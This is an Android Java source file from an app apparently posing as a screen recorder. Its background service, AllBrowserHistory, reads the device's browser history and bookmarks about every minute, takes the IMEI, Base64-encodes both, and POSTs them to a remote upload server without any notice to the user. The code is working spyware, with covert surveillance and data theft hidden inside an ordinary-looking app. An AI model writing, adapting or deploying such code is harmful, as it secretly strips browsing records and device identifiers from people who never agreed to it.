package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.provider.Browser;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class AllBrowserHistory extends Service {
    public static boolean BrowserHistory_start = false;
    StringBuffer sb;
    String BHistoryData;
    String FileName = "";
    String time_stamp = "";
    Timer brtimer;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        BrowserHistory_start = true;
        brtimer = new Timer();
        brtimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- AllBrowserHistory");
                SendBrowserHistory();
            }
        }, 20000, 60500);
        return super.onStartCommand(intent, flags, startId);
    }

    public void getBrowserHistory() {
        sb = new StringBuffer();
        boolean cont = true;
        String[] projection = new String[]{Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.VISITS,
                Browser.BookmarkColumns.BOOKMARK, Browser.BookmarkColumns.DATE, Browser.BookmarkColumns._ID};
        try {
            Cursor mCur = getContentResolver().query(android.provider.Browser.BOOKMARKS_URI, projection, null, null, null);
            mCur.moveToFirst();

            int titleIdx = mCur.getColumnIndex(Browser.BookmarkColumns.TITLE);
            int urlIdx = mCur.getColumnIndex(Browser.BookmarkColumns.URL);
            int visitIdx = mCur.getColumnIndex(Browser.BookmarkColumns.VISITS);
            int bookmarkIdx = mCur.getColumnIndex(Browser.BookmarkColumns.BOOKMARK);
            int date = mCur.getColumnIndex(Browser.BookmarkColumns.DATE);
            int id = mCur.getColumnIndex(Browser.BookmarkColumns._ID);


            if (mCur.moveToFirst() && mCur.getCount() > 0) {

                while (mCur.isAfterLast() == false && cont) {

                    sb.append("\n" + mCur.getString(id) + "#,$");
                    sb.append("\n" + mCur.getString(titleIdx) + "#,$");
                    sb.append("\n" + mCur.getString(urlIdx) + "#,$");
                    sb.append("\nV" + mCur.getString(visitIdx) + "#,$");
                    sb.append("\n" + mCur.getString(bookmarkIdx) + "#,$");
                    sb.append("\n" + new Date(date).toString() + "#,$");
                    sb.append("\n---------------");



                    mCur.moveToNext();
                }
            }
        } catch (Exception e) {

        }

    }

    private void SendBrowserHistory() {

        sb = new StringBuffer();
        boolean cont = true;
        String[] projection = new String[]{Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.VISITS,
                Browser.BookmarkColumns.BOOKMARK, Browser.BookmarkColumns.DATE, Browser.BookmarkColumns._ID};

        try {
            Cursor mCur = getContentResolver().query(android.provider.Browser.BOOKMARKS_URI, projection, null, null, null);
            mCur.moveToFirst();

            int titleIdx = mCur.getColumnIndex(Browser.BookmarkColumns.TITLE);
            int urlIdx = mCur.getColumnIndex(Browser.BookmarkColumns.URL);
            int visitIdx = mCur.getColumnIndex(Browser.BookmarkColumns.VISITS);
            int bookmarkIdx = mCur.getColumnIndex(Browser.BookmarkColumns.BOOKMARK);
            int date = mCur.getColumnIndex(Browser.BookmarkColumns.DATE);
            int id = mCur.getColumnIndex(Browser.BookmarkColumns._ID);
            //long datetime = mCur.getLong(Browser.HISTORY_PROJECTION_DATE_INDEX);

            if (mCur.moveToFirst() && mCur.getCount() > 0) {
                while (mCur.isAfterLast() == false && cont) {

                    sb.append("\n" + mCur.getString(id) + "#,$");
                    sb.append("\n" + mCur.getString(titleIdx) + "#,$");
                    sb.append("\n" + mCur.getString(urlIdx) + "#,$");
                    sb.append("\nV" + mCur.getString(visitIdx) + "#,$");
                    sb.append("\n" + mCur.getString(bookmarkIdx) + "#,$");
                    sb.append("\n" + new Date(date).toString() + "#,$");
                    sb.append("\n---------------");
                    mCur.moveToNext();
                }
            }
        } catch (Exception e) {
            Log.e("..............", "BrowserCheck Error -> " + e.toString());
        }

//        Values.setSharedPrefrence("browser_data", "", getApplicationContext());
//        Values.setSharedPrefrence("browser_data", sb.toString(), getApplicationContext());

        InputStream CallStream = null;
        HttpClient Filehttpclient = new DefaultHttpClient();
        String fsupload = UrlDemo.fsupload;
        HttpPost filehttpPost = new HttpPost(fsupload);

        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        byte[] imeiBHistory = imei.getBytes();
        String imeiBhistoryEncode = android.util.Base64.encodeToString(imeiBHistory, android.util.Base64.DEFAULT);
        String imeiBHistoryString = imeiBhistoryEncode.replaceAll("\n", "");

        BHistoryData = android.util.Base64.encodeToString(sb.toString().getBytes(), android.util.Base64.DEFAULT);

        String BHistoryDataString = BHistoryData.replaceAll("\n", "");
        System.out.println("BrowserHistoryBaseString ==" + BHistoryDataString);

        try {
            Date dt = new Date();
            int min = dt.getMinutes();
            int hr = dt.getHours();
            String strmin = "", strhr = "";
            if (min < 10)
                strmin = "0" + Integer.toString(min);
            else
                strmin = Integer.toString(min);
            if (hr < 10)
                strhr = "0" + Integer.toString(hr);
            else
                strhr = Integer.toString(hr);
            time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";
        } catch (Exception e) {
            Log.d(getClass().getSimpleName(), "Exception:" + e);

        }

        try {
            SharedPreferences sp = getSharedPreferences("key", 0);
            String tValue = sp.getString("chkbrowser", "");
            Log.d("checkcon-------", "BrowserSharedvaluereceive::::------" + tValue);

            String Callfile_name = "BrowserHistory.txt";
            byte[] namedata = Callfile_name.getBytes("UTF-8");
            String filenameencode = android.util.Base64.encodeToString(namedata, android.util.Base64.DEFAULT);
            FileName = filenameencode.replaceAll("\n", "");

            List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();

            ConnectivityManager connectivity;
            NetworkInfo wifiInfo;
            connectivity = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
            wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")) {
                System.out.println("IMEI NOT NUll wifi = ");
                nameValuePair.add(new BasicNameValuePair("FNAME", FileName));
                nameValuePair.add(new BasicNameValuePair("IMEI", imeiBHistoryString));
                nameValuePair.add(new BasicNameValuePair("DATA", BHistoryDataString));

                filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                HttpResponse response = Filehttpclient.execute(filehttpPost);

                response.getStatusLine();

                HttpEntity entity = response.getEntity();
                entity = response.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read(); i != -1; i = in.read()) {
                    buffer += (char) i;
                    i++;
                }

                Log.d("Test", "Response of BrowserHistory = " + buffer);
                sb.setLength(0);
            } else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")) {
                System.out.println("IMEI NOT NUll wifi = ");
                nameValuePair.add(new BasicNameValuePair("FNAME", FileName));
                nameValuePair.add(new BasicNameValuePair("IMEI", imeiBHistoryString));
                nameValuePair.add(new BasicNameValuePair("DATA", BHistoryDataString));

                filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                HttpResponse response = Filehttpclient.execute(filehttpPost);

                response.getStatusLine();

                HttpEntity entity = response.getEntity();
                entity = response.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read(); i != -1; i = in.read()) {
                    buffer += (char) i;
                    i++;
                }

                Log.d("Test", "Response of BrowserHistory = " + buffer);
                sb.setLength(0);
            } else {
                Log.d("checkconError", "AllBrowserHistoty connection erro");
                return;
            }
            sb.setLength(0);
        } catch (Exception e) {
            Log.d("BrowserException ", "BrowserException =" + e);
        }
        sb.setLength(0);

    }

    @Override
    public void onDestroy() {
        try {
            brtimer.cancel();
        } catch (Exception e) {}
        BrowserHistory_start = false;
        super.onDestroy();
    }

}